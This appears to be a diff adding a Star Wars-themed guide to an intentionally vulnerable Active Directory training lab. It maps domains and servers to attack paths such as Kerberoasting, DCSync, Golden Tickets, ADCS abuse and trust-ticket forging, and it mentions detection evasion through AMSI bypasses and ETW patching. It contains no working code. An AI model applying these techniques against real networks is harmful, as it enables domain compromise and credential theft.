+graph TD
+    classDef empire fill:#000000,stroke:#ff0000,stroke-width:2px,color:#fff;
+    classDef rebel fill:#2b5c8f,stroke:#ff9900,stroke-width:2px,color:#fff;
+    classDef trade fill:#4a4a4a,stroke:#aaaaaa,stroke-width:2px,color:#fff;
+    classDef highlight fill:#440000,stroke:#ff0000,stroke-width:3px,color:#fff;
+
+    subgraph The Galactic Empire (empire.local)
+        Coruscant["Coruscant (Root DC)<br/>coruscant.empire.local"]:::empire
+        DeathStar["The Death Star (Child DC)<br/>deathstar.eu.empire.local"]:::highlight
+        Scarif["Scarif Citadel (File Server)<br/>scarif.empire.local"]:::empire
+        Kamino["Kamino Cloning Facility (SQL)<br/>kamino.empire.local"]:::empire
+        Endor["Endor Shield Generator (CA)<br/>endor.empire.local"]:::empire
+        Mandalore["Mandalore Mercenary Base (Linux)<br/>mandalore.empire.local"]:::empire
+        Coruscant -- "Imperial Command" --> DeathStar
+        Coruscant --- Scarif
+        Coruscant --- Kamino
+        Coruscant --- Endor
+        Coruscant --- Mandalore
+    end
+
+    subgraph The Rebel Alliance (rebel.local)
+        Yavin4["Yavin 4 Base<br/>yavin4.rebel.local"]:::rebel
+    end
+
+    subgraph The Trade Federation (trade.corp)
+        Neimoidia["Cato Neimoidia<br/>neimoidia.trade.corp"]:::trade
+    end
+
+    Coruscant <-->|Espionage / External Trust| Yavin4
+    Coruscant <-->|Treaty / Forest Trust| Neimoidia
+```
+
+## Infrastructure Mapping
+
+Understanding the infrastructure is key to successfully executing your attack paths. Here is how the technical components of the EMPIRE AD lab map to the Star Wars universe:
+
+### 1. The Core Domains
+* **`empire.local` (The Galactic Empire):** The central root domain. This is the seat of the Emperor and the Imperial Senate. Taking over this domain is equivalent to taking over Coruscant. It controls all the core infrastructure.
+* **`eu.empire.local` (The Death Star):** A child domain of `empire.local`. While it reports to the root domain, it holds immense power. Escaping the child domain to compromise the root domain is the equivalent of using the Death Star plans to destroy the Empire.
+* **`rebel.local` (The Rebel Alliance):** An external forest. It has an external trust with the Empire (perhaps through espionage or captured spies). Moving laterally across this trust requires finding a weak link in the Rebel defenses.
+* **`trade.corp` (The Trade Federation):** A separate forest with a bidirectional forest trust. The Empire uses them for resources, but you can forge trust tickets (Inter-Realm TGTs) to cross this boundary.
+
+### 2. High-Value Targets (Servers)
+* **`coruscant.empire.local` (Coruscant Root DC):** The ultimate prize. Achieving Domain Admin here gives you the keys to the galaxy.
+* **`endor.empire.local` (Endor Shield Generator / ADCS):** Active Directory Certificate Services. If you can compromise the CA (via ESC1, ESC8, etc.), you can forge certificates for any user in the Empire, effectively bringing down the deflector shields.
+* **`scarif.empire.local` (Scarif Citadel):** This file server hosts critical SMB shares. It is the repository of the Death Star plans. Look for exposed passwords in scripts or configuration files left by careless Imperial engineers.
+* **`kamino.empire.local` (Kamino Facility):** The SQL Server. SQL injection or xp_cmdshell here can lead to a foothold. It represents the cloning facilities—a hidden source of power.
+* **`mandalore.empire.local` (Mandalore Base):** The Linux-in-AD member. Contains local privilege escalations and cross-OS pivot opportunities. Represents the mercenary faction employed by the Empire.
+
+### 3. Attack Paths and Tactics
+* **Initial Access (The Smuggler's Route):** Finding an exposed SMB share or exploiting an LLMNR poisoning vulnerability (Responder) is like slipping past the Imperial blockade.
+* **Kerberoasting (Bounty Hunting):** Requesting TGS tickets for service accounts and cracking them offline is like putting a bounty on a high-value target and cracking their encryption.
+* **DCSync (The Force):** Using `secretsdump` to pull the `krbtgt` hash directly from the Domain Controller. It's an invisible, powerful attack that bypasses normal defenses.
+* **Golden Ticket (Order 66):** Once you have the `krbtgt` hash, you can forge a TGT for any user, granting you infinite access. It is the ultimate executive order, overriding all security protocols.
+* **Trust Abuse (Diplomatic Immunity):** Forging a trust ticket to cross from the Child Domain to the Root Domain.
+
+## The Hacker's Code (Sith vs Jedi)
+As you navigate the lab, remember that the tools you use define your path. Will you use noisy, aggressive tools (The Dark Side) that trigger every alarm, or will you use stealthy, precise tradecraft (The Light Side) to move undetected?
+
+* **The Dark Side (Noisy):** Running `BloodHound` with all collection methods, spraying passwords across the entire domain, and dropping standard Mimikatz binaries to disk. It is powerful and fast, but leaves a massive trail.
+* **The Light Side (Stealthy):** Targeted LDAP queries, memory-only execution via Covenant or Cobalt Strike, and careful evasion of logging (AMSI bypasses, ETW patching).
+
+## Flag Locations (Holocrons)
+Hidden throughout the EMPIRE AD lab are flags (Holocrons) that prove your mastery over the environment. Look for `FLAG-*.txt` files on desktops, hidden SMB shares, and within the SQL databases. 
+
+**Remember:** 
+* "Your focus determines your reality." - Qui-Gon Jinn. Focus on the attack paths mapped out in `PLAN.md`.
+* "I find your lack of faith disturbing." - Darth Vader. If an exploit fails, check your syntax, your targeting, and the underlying misconfiguration. The lab is intentionally vulnerable.
+
+May the Force be with you as you conquer the EMPIRE AD!
